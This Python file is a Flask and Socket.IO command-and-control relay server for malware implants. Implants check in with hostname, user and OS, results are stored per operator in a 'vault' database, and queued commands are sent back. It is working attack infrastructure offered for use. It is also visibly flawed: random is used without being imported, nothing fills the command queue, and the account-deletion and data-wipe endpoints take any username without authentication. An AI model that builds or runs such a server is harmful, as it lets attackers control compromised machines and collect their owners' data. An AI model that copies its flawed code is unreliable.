# C2_Server/relay_server.py
import sys, os, sqlite3, json, time, threading, logging, psycopg2
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta

# --- Basic Configuration ---
INACTIVITY_PERIOD_DAYS = 180
CLEANUP_INTERVAL_SECONDS = 86400
SESSION_TIMEOUT_SECONDS = 40
SERVER_START_TIME = datetime.utcnow()
DATABASE_URL = os.environ.get('DATABASE_URL')

# --- Logging Setup ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s', handlers=[logging.FileHandler("relay_server.log"), logging.StreamHandler(sys.stdout)])

# --- Database Connection Check ---
if not DATABASE_URL:
    logging.critical("FATAL ERROR: DATABASE_URL environment variable is not set. The application cannot start.")
    sys.exit(1)
try:
    conn = psycopg2.connect(DATABASE_URL)
    conn.close()
    logging.info("Successfully connected to the external database.")
except psycopg2.OperationalError as e:
    logging.critical(f"FATAL ERROR: Could not connect to the database: {e}")
    sys.exit(1)

# --- App and Extensions Initialization ---
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24).hex()
limiter = Limiter(get_remote_address, app=app, default_limits=["200 per day", "50 per hour"], storage_uri="memory://")
socketio = SocketIO(app, async_mode='threading')

class DatabaseManager:
    def __init__(self):
        self.conn = psycopg2.connect(DATABASE_URL)
        self.conn.autocommit = True
        self.setup_schema()

    def _execute(self, query, params=None, fetch=None):
        with self.conn.cursor() as cursor:
            cursor.execute(query, params or ())
            if fetch == 'one': return cursor.fetchone()
            if fetch == 'all': return cursor.fetchall()

    def setup_schema(self):
        self._execute("""CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password_hash TEXT NOT NULL, assigned_line INTEGER NOT NULL, last_login TIMESTAMPTZ);""")
        self._execute("""CREATE TABLE IF NOT EXISTS sessions (session_id TEXT PRIMARY KEY, owner_username TEXT NOT NULL REFERENCES users(username) ON DELETE CASCADE, metadata JSONB, alias TEXT);""")
        self._execute("""CREATE TABLE IF NOT EXISTS vault (session_id TEXT, module_name TEXT, data JSONB, PRIMARY KEY (session_id, module_name), FOREIGN KEY (session_id) REFERENCES sessions(session_id) ON DELETE CASCADE);""")

    def sanitize_data_for_user(self, username):
        """Correctly deletes only the data (sessions and vault), leaving the user account."""
        try:
            self._execute("DELETE FROM sessions WHERE owner_username = %s", (username,))
            return True
        except psycopg2.Error as e:
            logging.error(f"Database sanitize error for user {username}: {e}")
            return False
            
    def delete_user_account(self, username):
        """Correctly deletes the entire user account and all their data via cascading delete."""
        try:
            self._execute("DELETE FROM users WHERE username = %s", (username,))
            return True
        except psycopg2.Error as e:
            logging.error(f"Database account deletion error for user {username}: {e}")
            return False

    def create_user(self, username, password_hash):
        try:
            self._execute("INSERT INTO users (username, password_hash, assigned_line, last_login) VALUES (%s, %s, %s, %s)", (username, password_hash, random.randint(1, 10), datetime.utcnow()))
            return True
        except psycopg2.IntegrityError:
            return False

    def get_user(self, username):
        return self._execute("SELECT username, password_hash, assigned_line FROM users WHERE username = %s", (username,), fetch='one')

    def update_user_last_login(self, username):
        self._execute("UPDATE users SET last_login = %s WHERE username = %s", (datetime.utcnow(), username))

    def find_and_delete_inactive_users(self):
        cutoff_date = datetime.utcnow() - timedelta(days=INACTIVITY_PERIOD_DAYS)
        inactive_users_rows = self._execute("SELECT username FROM users WHERE last_login IS NOT NULL AND last_login < %s", (cutoff_date,), fetch='all')
        if not inactive_users_rows: return
        for row in inactive_users_rows:
            self.delete_user_account(row[0])

    def create_or_update_session(self, session_id, owner_username, metadata=None):
        query = "INSERT INTO sessions (session_id, owner_username, metadata) VALUES (%s, %s, %s) ON CONFLICT (session_id) DO UPDATE SET metadata = EXCLUDED.metadata WHERE sessions.metadata IS DISTINCT FROM EXCLUDED.metadata;"
        self._execute(query, (session_id, owner_username, json.dumps(metadata or {})))

    def save_vault_data(self, session_id, module_name, data):
        query = "INSERT INTO vault (session_id, module_name, data) VALUES (%s, %s, %s) ON CONFLICT (session_id, module_name) DO UPDATE SET data = EXCLUDED.data;"
        self._execute(query, (session_id, module_name, json.dumps(data)))

    def load_vault_data_for_user(self, username):
        sessions_rows = self._execute("SELECT session_id, metadata, alias FROM sessions WHERE owner_username = %s", (username,), fetch='all')
        vault_data = {sid: {"metadata": metadata or {}, "alias": alias} for sid, metadata, alias in sessions_rows}
        if not vault_data: return {}
        vault_rows = self._execute("SELECT session_id, module_name, data FROM vault WHERE session_id IN %s", (tuple(vault_data.keys()),), fetch='all')
        for sid, mod_name, data_json in vault_rows:
            if sid in vault_data: vault_data[sid][mod_name] = data_json
        return vault_data

db = DatabaseManager()
active_sessions = {}
session_lock = threading.Lock()
client_sids = {}
command_queue = {}
cmd_lock = threading.Lock()

@app.route('/auth/register', methods=['POST'])
@limiter.limit("5 per minute")
def register():
    data = request.json
    username, password = data.get('username'), data.get('password')
    if not username or not isinstance(username, str) or not (3 <= len(username) <= 20):
        return jsonify({"success": False, "error": "Username must be between 3 and 20 characters."}), 400
    if not password or not isinstance(password, str) or len(password) < 6:
        return jsonify({"success": False, "error": "Password must be at least 6 characters long."}), 400
    if db.create_user(username, generate_password_hash(password)):
        logging.warning(f"New user registered: '{username}' from IP: {get_remote_address()}")
        return jsonify({"success": True, "message": "Account created successfully."})
    else:
        return jsonify({"success": False, "error": "Username already exists."}), 409

@app.route('/auth/login', methods=['POST'])
@limiter.limit("10 per minute")
def login():
    data = request.json
    username, password = data.get('username'), data.get('password')
    user = db.get_user(username)
    if user and check_password_hash(user[1], password):
        db.update_user_last_login(username)
        logging.info(f"Successful login for user '{username}' from IP: {get_remote_address()}")
        return jsonify({"success": True, "username": user[0], "assigned_line": user[2]})
    else:
        logging.warning(f"Failed login attempt for username '{username}' from IP: {get_remote_address()}")
        return jsonify({"success": False, "error": "Invalid username or password."}), 401

@app.route('/auth/delete', methods=['POST'])
@limiter.limit("5 per hour")
def delete_account():
    username = request.json.get("username")
    if not username:
        return jsonify({"success": False, "error": "Username is required."}), 400
    if not db.get_user(username):
        return jsonify({"success": False, "error": "User not found."}), 404
    if db.delete_user_account(username):
        logging.warning(f"User account DELETED: '{username}' from IP: {get_remote_address()}")
        return jsonify({"success": True, "message": "Account and all associated data have been permanently deleted."})
    else:
        logging.error(f"Failed account deletion for user '{username}' from IP: {get_remote_address()}")
        return jsonify({"success": False, "error": "A server error occurred during account deletion."}), 500

@app.route('/c2/sanitize', methods=['POST'])
def handle_c2_sanitize():
    username = request.json.get("username")
    if not username:
        return jsonify({"success": False, "error": "Username is required"}), 400
    if db.sanitize_data_for_user(username):
        logging.warning(f"User '{username}' sanitized their data from IP: {get_remote_address()}")
        return jsonify({"success": True, "message": f"All data for user '{username}' has been sanitized."})
    else:
        return jsonify({"success": False, "error": "A database error occurred during sanitation."}), 500

@app.route('/implant/hello', methods=['POST'])
def handle_implant_hello():
    data = request.json
    sid, c2_user = data.get("session_id"), data.get("c2_user")
    if not all([sid, c2_user]):
        return jsonify({"error": "session_id and c2_user are required"}), 400
    metadata = {"hostname": data.get("hostname"), "user": data.get("user"), "os": data.get("os")}
    with session_lock:
        is_new_or_reconnecting = sid not in active_sessions
        active_sessions[sid] = {"owner": c2_user, "last_seen": time.time()}
        db.create_or_update_session(sid, c2_user, metadata)
        if is_new_or_reconnecting:
            socketio.emit('new_session', {'session_id': sid, 'metadata': metadata, 'status': 'Online'}, room=c2_user)
    if "results" in data:
        for result in data.get("results", []):
            db.save_vault_data(sid, result.get("command"), result)
        socketio.emit('batch_update', {'session_id': sid, 'results': data['results']}, room=c2_user)
    with cmd_lock:
        commands_to_send = command_queue.get(c2_user, {}).pop(sid, [])
    return jsonify({"commands": commands_to_send})

if __name__ == '__main__':
    def start_cleanup_scheduler():
        db.find_and_delete_inactive_users()
        threading.Timer(CLEANUP_INTERVAL_SECONDS, start_cleanup_scheduler).start()
    def check_offline_implants():
        while True:
            with session_lock:
                offline_sids = [sid for sid, data in active_sessions.items() if time.time() - data.get("last_seen", 0) > SESSION_TIMEOUT_SECONDS]
                for sid in offline_sids:
                    owner = active_sessions.pop(sid, {}).get('owner')
                    if owner:
                        socketio.emit('session_updated', {'session_id': sid, 'status': 'Offline'}, room=owner)
            time.sleep(15)
    start_cleanup_scheduler()
    threading.Thread(target=check_offline_implants, daemon=True).start()
    port = int(os.environ.get('PORT', 5001))
    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)